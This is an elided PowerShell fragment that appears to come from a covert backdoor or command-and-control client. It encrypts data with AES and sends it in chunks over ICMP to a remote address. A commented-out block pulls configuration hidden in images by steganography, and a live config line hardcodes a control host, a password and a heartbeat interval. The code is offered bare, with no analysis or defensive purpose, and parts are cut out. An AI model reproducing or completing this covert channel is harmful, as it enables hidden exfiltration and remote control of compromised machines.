        ...
        if ($reply.Buffer)
        {
            ...
            if ($sendbytes.length -gt $BufferSize)
            {
                while ($i -lt $index )
                {
                    ...
                    $sendbytes2 = $aes.Encrypt($sendbytes2)
                    $icmp.Send($IPAddress, $timeout, $sendbytes2, $opt) | Out-Null
                    $i += 1
                }
...
# $config = Get-Images "thisisaninvisibletag" | % {
# 	$buf = Read-Steg $_
...
$config = @{host="chichou.me"; password="P@s5w0rd"; heartbeat=3000}
